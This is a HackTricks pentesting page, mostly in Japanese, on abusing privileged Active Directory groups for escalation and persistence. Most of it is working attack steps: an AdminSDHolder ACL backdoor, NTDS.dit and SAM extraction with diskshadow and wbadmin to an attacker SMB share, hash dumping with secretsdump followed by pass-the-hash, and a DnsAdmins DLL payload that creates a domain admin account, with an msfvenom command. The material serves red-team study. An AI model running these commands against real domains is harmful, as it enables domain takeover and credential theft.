# 特権グループ

{{#include ../../banners/hacktricks-training.md}}

## 管理権限を持つ既知のグループ

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

このグループは、ドメイン上で管理者ではないアカウントおよびグループを作成する権限を持ちます。さらに、ドメイン コントローラー (DC) へのローカルログインを可能にします。

このグループのメンバーを特定するために、次のコマンドが実行されます:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
新しいユーザーの追加が許可されており、DCへのローカルログインも可能です。

## AdminSDHolder グループ

**AdminSDHolder** グループの Access Control List (ACL) は、Active Directory 内の高権限グループを含むすべての「protected groups」に対する権限を設定するため極めて重要です。この仕組みは不正な変更を防ぐことでこれらのグループのセキュリティを確保します。

攻撃者は**AdminSDHolder** グループの ACL を変更して標準ユーザーにフル権限を与えることでこれを悪用できます。これによりそのユーザーはすべての protected groups に対する実質的な完全な制御を得ます。もしこのユーザーの権限が変更または削除されても、システムの設計上通常1時間以内に自動的に復元されます。

メンバーの確認や権限の変更に使用されるコマンド例：
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
復元プロセスを迅速化するためのスクリプトが利用可能です: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

詳細は [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) を参照してください。

## AD Recycle Bin

このグループのメンバーであると、削除された Active Directory オブジェクトを読み取ることができ、機密情報が明らかになる場合があります：
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### ドメインコントローラへのアクセス

DC上のファイルへのアクセスは、ユーザーが `Server Operators` グループのメンバーでない限り制限されており、その場合アクセス権のレベルが変わります。

### 権限昇格

Sysinternals の `PsService` や `sc` を使うと、サービスの権限を調査・変更できます。例えば `Server Operators` グループは特定のサービスに対してフルコントロールを持っており、任意のコマンド実行や権限昇格を可能にします：
```cmd
C:\> .\PsService.exe security AppReadiness
```
このコマンドは、`Server Operators` がフルアクセス権を持ち、サービスの操作を行って権限昇格を可能にすることを示します。

## Backup Operators

`Backup Operators` グループのメンバーであると、`SeBackup` および `SeRestore` 権限により `DC01` のファイルシステムにアクセスできます。これらの権限は、`FILE_FLAG_BACKUP_SEMANTICS` フラグを用いることで、明示的なアクセス許可がなくてもフォルダの横断、一覧表示、ファイルのコピーを可能にします。この処理には特定のスクリプトを使用する必要があります。

グループのメンバーを一覧表示するには、次を実行します:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### ローカル攻撃

これらの特権をローカルで活用するために、次の手順を実行します:

1. 必要なライブラリをインポートする:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` を有効化して検証する:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 制限されたディレクトリからファイルにアクセスしてコピーする、例えば:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Domain Controller のファイルシステムへの直接アクセスにより、`NTDS.dit` データベースを盗むことができます。このデータベースにはドメインユーザーとコンピューターのすべての NTLM ハッシュが含まれています。

#### diskshadow.exe を使用する

1. `C` ドライブのシャドウコピーを作成します:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. シャドウコピーから `NTDS.dit` をコピーする:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
代わりに、ファイルのコピーには `robocopy` を使用してください:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. ハッシュを取得するために `SYSTEM` と `SAM` を抽出する:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit` からすべてのハッシュを取得する:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. 抽出後: Pass-the-Hash を使って DA へ
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### wbadmin.exe を使用する

1. attacker machine 上の SMB サーバー用に NTFS ファイルシステムをセットアップし、target machine 上で SMB credentials をキャッシュします。
2. システムバックアップと `NTDS.dit` の抽出に `wbadmin.exe` を使用します:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

実践的なデモは [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s) を参照してください。

## DnsAdmins

**DnsAdmins** グループのメンバーは、その権限を悪用して、Domain Controllers 上でホストされていることが多い DNS サーバー上で SYSTEM 特権により任意の DLL をロードすることができます。これは重大な悪用の可能性をもたらします。

DnsAdmins グループのメンバーを列挙するには、次を使用します:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> この脆弱性により、DNSサービス（通常はDCs内）でSYSTEM権限で任意のコードを実行できます。この問題は2021年に修正されました。

メンバーは、以下のようなコマンドを使用して、DNSサーバーに任意のDLL（ローカルまたはリモート共有から）を読み込ませることができます：
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DLLを読み込むには、DNSサービスの再起動（追加の権限が必要な場合があります）が必要です:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
この攻撃ベクターの詳細については、ired.teamを参照してください。

#### Mimilib.dll

コマンド実行のためにmimilib.dllを利用することも可能で、特定のコマンドや reverse shells を実行するように改変できます。 [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.

### WPAD Record for MitM

DnsAdmins は global query block list を無効化した後に WPAD レコードを作成することで、Man-in-the-Middle (MitM) 攻撃を行うために DNS レコードを操作できます。Responder や Inveigh のようなツールは、spoofing やネットワークトラフィックのキャプチャに使用できます。

### Event Log Readers
メンバーはイベントログにアクセスでき、平文パスワードやコマンド実行の詳細などの機密情報を見つける可能性があります：
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

このグループはドメインオブジェクトのDACLsを変更でき、DCSync権限を付与する可能性があります。Exchange-AD-Privesc GitHub repo に、このグループを悪用した権限昇格の手法が詳述されています。
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrators

Hyper-V Administrators は Hyper-V への完全なアクセス権を持っており、これを悪用して仮想化されたドメインコントローラーを制御することができます。これには、稼働中の DC のクローン作成や NTDS.dit ファイルからの NTLM ハッシュ抽出が含まれます。

### Exploitation Example

Firefox の Mozilla Maintenance Service は Hyper-V Administrators によって悪用され、SYSTEM としてコマンドを実行させることができます。これは、保護された SYSTEM ファイルへのハードリンクを作成し、それを悪意のある実行ファイルに置き換えることを伴います:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Note: Hard link exploitation has been mitigated in recent Windows updates.

## Group Policy Creators Owners

このグループのメンバーはドメイン内で Group Policies を作成できます。ただし、メンバーはユーザーやグループに group policies を適用したり、既存の GPOs を編集したりすることはできません。

## Organization Management

In environments where **Microsoft Exchange** is deployed, a special group known as **Organization Management** holds significant capabilities. This group is privileged to **access the mailboxes of all domain users** and maintains **full control over the 'Microsoft Exchange Security Groups'** Organizational Unit (OU). This control includes the **`Exchange Windows Permissions`** group, which can be exploited for privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

Members of the **Print Operators** group are endowed with several privileges, including the **`SeLoadDriverPrivilege`**, which allows them to **log on locally to a Domain Controller**, shut it down, and manage printers. To exploit these privileges, especially if **`SeLoadDriverPrivilege`** is not visible under an unelevated context, bypassing User Account Control (UAC) is necessary.

このグループのメンバーを一覧表示するには、次の PowerShell コマンドを使用します:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
より詳細なエクスプロイト手法（**`SeLoadDriverPrivilege`** に関連する）については、特定のセキュリティ資料を参照してください。

#### リモートデスクトップユーザー

このグループのメンバーは Remote Desktop Protocol (RDP) を介して PC へのアクセス権が付与されています。これらのメンバーを列挙するには、PowerShell コマンドが利用できます:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDP を悪用するさらなる洞察は、専用の pentesting リソースにあります。

#### リモート管理ユーザー

メンバーは **Windows Remote Management (WinRM)** を介して PC にアクセスできます。これらのメンバーの列挙は次の方法で行われます:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM** に関連するエクスプロイト手法については、個別のドキュメントを参照してください。

#### Server Operators

このグループは、Domain Controllers に対してバックアップおよび復元の権限、システム時刻の変更、システムのシャットダウンなど、さまざまな構成を行う権限を持ちます。メンバーを列挙するには、以下のコマンドを実行します：
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## 参考文献 <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
